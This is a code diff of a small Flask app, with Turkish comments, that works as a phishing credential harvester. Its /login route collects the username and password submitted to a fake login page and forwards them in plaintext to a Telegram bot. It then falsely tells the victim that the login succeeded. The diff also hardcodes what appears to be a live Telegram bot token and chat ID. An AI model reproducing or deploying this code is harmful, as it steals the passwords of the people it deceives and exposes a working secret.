@@ -1,16 +1,16 @@
-from flask import Flask, request
+from flask import Flask, request, render_template
 import requests
-import os  # Çevre değişkenlerini okumak için
+import os
 
 app = Flask(__name__)
 
-# 🔹 Telegram Bilgileri (Render'da tanımlanacak!)
-TOKEN = os.environ.get("7877952923:AAH45-_l94zL5JEY7fsSwiV3qRGR8jQ1Wbw")
-CHAT_ID = os.environ.get("7107883815")
+# 🔹 Telegram Bilgileri
+TOKEN = "7877952923:AAH45-_l94zL5JEY7fsSwiV3qRGR8jQ1Wbw"  # Senin bot tokenin
+CHAT_ID = "7107883815"  # Senin chat ID
 
 @app.route('/')
 def home():
-    return "Login Sayfası Çalışıyor!"
+    return render_template("index.html")  # Artık HTML sayfamızı gösteriyoruz!
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -21,15 +21,14 @@ def login():
         return "Eksik bilgi!", 400
 
     # 📩 Telegram’a mesaj gönder
-    message = f"📩 Yeni Giriş Bilgisi\n👤 Kullanıcı: {username}\n🔑 Şifre: {password}"
+    message = f"\U0001F4E9 Yeni Giriş Bilgisi\n👤 Kullanıcı: {username}\n🔑 Şifre: {password}"
     send_to_telegram(message)
 
     return "Giriş başarılı!"
 
 def send_to_telegram(message):
-    if TOKEN and CHAT_ID:
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-        requests.post(url, data={"chat_id": CHAT_ID, "text": message})
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    requests.post(url, data={"chat_id": CHAT_ID, "text": message})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
